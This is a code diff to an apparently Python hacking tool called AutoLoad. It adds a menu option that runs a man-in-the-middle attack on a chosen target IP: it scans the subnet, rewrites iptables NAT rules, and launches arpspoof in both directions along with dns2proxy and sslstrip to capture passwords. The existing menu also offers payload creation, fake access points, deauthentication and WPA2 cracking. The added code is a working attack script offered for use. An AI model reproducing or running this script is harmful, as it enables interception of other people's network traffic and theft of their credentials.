@@ -22,7 +22,7 @@ print(Fore.GREEN +"       / _ \| | | | __/ _ \| |  | | | |/ _` |/ _` |  |"+Fore.
 print(Fore.GREEN +"      / ___ \ |_| | || (_) | |__| |_| | (_| | (_| |  |"+Fore.WHITE +"http://majorhacke.blogspot.com/")
 print(Fore.GREEN +"     /_/   \_\__,_|\__\___/|_____\___/ \__,_|\__,_|  |"+Fore.BLUE +"::::::::Facebook::::::::")
 print(Fore.GREEN +"                Automatic Your Proccess              |"+Fore.WHITE +"http://facebook.com/majorhacke ")
-print(Fore.GREEN +"                       [created by Nafis] ["+Fore.WHITE +"V1.2"+Fore.GREEN +"]     |")
+print(Fore.GREEN +"                       [created by Nafis] ["+Fore.WHITE +"V1.3"+Fore.GREEN +"]     |")
 print(Fore.GREEN +"====================================================================================")
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -462,13 +462,91 @@ def nmaps():
             sys.exit()
         else:
             print(Fore.RED +"Try Again")
-            print(Fore.BLUE)    
+            print(Fore.BLUE)
+
+def mitm():
+    os.system('clear')
+    print("")
+    print(Fore.GREEN +"[*]::::::Perform Man_In_The_Middle Attack::::::")
+    print("")
+    print(Fore.BLUE +"1.) Sniff password + sslstrip")
+    print("2.) Stop Sniffing")
+    print("3.) Back")
+    print("4.) Exit")
+    print("")
+    def stopsniff():
+        os.system('clear')
+        print("")
+        print(Fore.GREEN +"[] Stop Sniffing......")
+        print("")
+        os.system('iptables -t nat --flush')
+        print("Done.....")
+        userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+        mitm()
+        
+    def startsniff():
+        try:
+            os.system('clear')
+            print("")
+            print(Fore.GREEN +"[*]::::::Sniff PassWord + sslstrip::::::")
+            print("")
+            os.system('route -n')
+            print("")
+            gateway=raw_input('[Enter your gateway:] > ')
+            interf=raw_input("[Enter your gateway's interface:] > ")
+            print("")
+            print('[Scanning Subnet.....]')
+            os.system('nmap -sP '+gateway+'/24')
+            print("")
+            target=raw_input("[Enter your Target IP:] > ")
+            print("setting up iptables...")
+            os.system('''iptables --flush
+		iptables --flush -t nat
+		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port 40''')
+            os.system('gnome-terminal --geometry 60x12+0+999999 -- python /root/AutoLoad/dns2proxy/dns2proxy.py')
+            os.system('gnome-terminal --geometry 60x20+999999+999999 -- arpspoof -i '+interf+' -t '+target+' '+gateway)
+            os.system('gnome-terminal --geometry 60x20+999999+0 -- arpspoof -i '+interf+' -t '+gateway+' '+target)
+            os.system('gnome-terminal --geometry 60x20+999999+0 -- sslstrip -l 8080')
+            print("Done..")
+            useer=raw_input(Fore.YELLOW +"press any key to go back....")
+            mitm()
+        except KeyboardInterrupt:
+            print("")
+            stopsniff()
+            print(Fore.GREEN +"Thanks For Using AutoLoad!")
+            sys.exit()
+
+ 
+        
+    userif = ''
+    while not(userif == '1' or userif == '2' or userif == '3' or userif == '4'):
+        userif=raw_input("[autoload:] > ")
+        if userif == '1':
+            os.system('clear')
+            startsniff()
+        elif userif == '2':
+            stopsniff()
+        elif userif == '3':
+            os.system('clear')
+            import Autoload
+        elif userif == '4':
+            print("")
+            print(Fore.GREEN +"Thanks For Using AutoLoad")
+            sys.exit()
+        else:
+            print(Fore.RED +"Wrong Choice")
+            os.system('clear')
+            mitm()
+
+    
 #------------------------------------------------------------------------------------------------------------------------------------------------------------        
 print("")
 print("|1.)"+Fore.WHITE +" Create Payload       "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +      "     |11.)"+Fore.WHITE +" Nmap Scan")
 print(Fore.GREEN +"|2.)"+Fore.WHITE +" Create a Wordlist    "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN +  "     |22.)"+Fore.WHITE +" Help")
 print(Fore.GREEN +"|3.)"+Fore.WHITE +" Create Fake AP       "+Fore.GREEN +"|7.)"+Fore.WHITE +" Crack Wpa2 HandShake"+Fore.GREEN + " |33.)"+Fore.WHITE +" Update")
 print(Fore.GREEN +"|4.)"+Fore.WHITE +" Deauth Attack        "+Fore.GREEN +"|8.)"+Fore.WHITE +" Capture Handshake  "+Fore.GREEN + "  |55.)"+Fore.WHITE +" Exit")
+print(Fore.GREEN +"|9.)"+Fore.WHITE +" MITM                 "+Fore.GREEN +"|10.)"+Fore.WHITE +" Coming soon  "+Fore.GREEN)
 print("")
 while True:
     try:
@@ -503,6 +581,10 @@ while True:
             os.system('clear')
         elif user == 8:
             capturehand()
+        elif user == 9:
+             mitm()
+        elif user == 10:
+            print(Fore.GREEN +"coming soon...")
         elif user == 55:
             print("")
             print(Fore.GREEN +"Thanks for using AutoLOad")
@@ -512,11 +594,13 @@ while True:
             sys.exit()
         else:
             print(Fore.RED +"Wrong Choice")
-        continue
+            continue
     except KeyboardInterrupt:
         print("")
         print(Fore.GREEN +"Thanks For Using AutoLoad!")
+        break
         sys.exit()
+        
     except SyntaxError:
         import Autoload
 
